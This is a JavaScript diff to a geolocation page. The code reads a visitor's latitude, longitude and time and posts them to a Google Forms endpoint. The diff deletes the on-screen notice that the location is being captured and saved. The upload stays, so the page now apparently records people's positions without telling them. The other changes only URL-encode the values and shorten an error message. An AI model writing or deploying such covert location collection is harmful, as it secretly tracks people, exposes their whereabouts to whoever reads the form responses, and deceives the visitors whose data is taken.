@@ -37,7 +37,7 @@ function getLocation() {
 
   if (!navigator.geolocation) {
     document.getElementById("out").innerHTML =
-      "Geolocation not supported on this device.";
+      "Geolocation not supported";
     return;
   }
 
@@ -51,9 +51,6 @@ function getLocation() {
       var lon = position.coords.longitude;
       var time = new Date().toLocaleString();
 
-      document.getElementById("out").innerHTML =
-        "Location captured ✔️<br>Saving to database...";
-
       fetch(
         "https://docs.google.com/forms/d/e/1FAIpQLSenIN4iNoUo7sPHfVd_EiIUQC1BO1nItPyERuAk0J7i97sTkQ/formResponse",
         {
@@ -63,8 +60,8 @@ function getLocation() {
             "Content-Type": "application/x-www-form-urlencoded"
           },
           body:
-            "entry.111=" + lat +
-            "&entry.222=" + lon +
+            "entry.111=" + encodeURIComponent(lat) +
+            "&entry.222=" + encodeURIComponent(lon) +
             "&entry.3333=" + encodeURIComponent(time)
         }
       );
